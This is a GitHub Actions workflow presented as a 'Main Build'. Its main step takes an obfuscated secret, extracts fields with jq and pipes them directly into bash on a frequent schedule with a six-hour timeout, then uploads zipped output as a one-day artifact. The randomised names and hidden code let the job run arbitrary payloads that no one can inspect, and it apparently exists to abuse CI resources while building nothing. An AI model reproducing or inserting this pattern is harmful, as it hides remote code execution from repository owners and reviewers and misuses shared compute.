name: Main Build
on:
  workflow_dispatch:

  schedule:
    - cron: '54 3,9,15,21 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  workflow:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Perform
        env:
          vjfot36259: ${{ secrets.vjfot36259 }}
        run: |
          printf '%s' "$vjfot36259" | jq -r .h926 | /bin/bash
          printf '%s' "$n8" | jq -r .xphel2925 | /bin/bash
          echo $twrh0 | jq -r .hxng60164 | /bin/bash

      - name: Archive results
        uses: actions/upload-artifact@v4
        with:
          name: QYDDBe6N
          path: "*.zip"
          retention-days: 1
